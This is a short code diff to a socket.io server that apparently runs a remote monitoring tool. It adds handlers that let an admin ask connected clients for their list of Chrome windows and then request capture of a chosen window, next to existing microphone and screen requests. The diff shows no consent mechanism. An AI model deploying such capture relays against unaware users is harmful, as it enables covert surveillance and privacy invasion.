@@ -52,6 +52,20 @@ io.on('connection', (socket) => {
     io.to(targetClientId).emit('request-mic', socket.id);
   });
 
+  // Request Chrome List
+  socket.on('request-chrome-list', (targetClientId) => {
+    io.to(targetClientId).emit('request-chrome-list', socket.id);
+  });
+
+  socket.on('chrome-list', (data) => {
+    io.to(data.adminId).emit('chrome-list', { targetId: socket.id, sources: data.sources });
+  });
+
+  // Request Chrome Window
+  socket.on('request-chrome-window', (data) => {
+    io.to(data.targetId).emit('request-chrome-window', { adminId: socket.id, sourceId: data.sourceId });
+  });
+
   // Admin explicit stops
   socket.on('stop-screen', (targetClientId) => {
     io.to(targetClientId).emit('stop-screen');
